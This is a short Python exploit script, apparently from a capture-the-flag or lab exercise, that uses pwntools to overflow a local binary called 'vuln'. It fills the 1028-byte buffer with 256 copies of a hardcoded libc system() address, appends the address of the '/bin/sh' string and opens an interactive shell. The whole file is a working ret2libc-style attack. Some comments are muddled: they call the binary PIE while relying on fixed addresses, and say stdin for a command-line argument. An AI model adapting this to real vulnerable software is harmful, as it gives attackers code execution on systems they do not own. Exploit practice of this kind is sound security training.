# the thing with this file is that it's pie so the offset is changing every time u run it. that's why were building the payload this way. 
from pwn import *

e = ELF("./vuln")

system_address = p32(0xf7c48150)
bin_sh_address = p32(0xf7dbd0f5) #the address of /bin/sh string (shell), which will be the argument for system.

final_payload = system_address * 256 +  bin_sh_address #fill the buffer size (1028) with system address, so no matter when it lend it will execute system function with system as argument and then go to the next system and so on' untill it will get to the system that gets 'bin/sh' as argument.

#gdb.debug([e.path, final_payload])
local = e.process([final_payload]) #end the payload as an argument from stdin when running the executable. 

print(local.recv())
local.interactive()


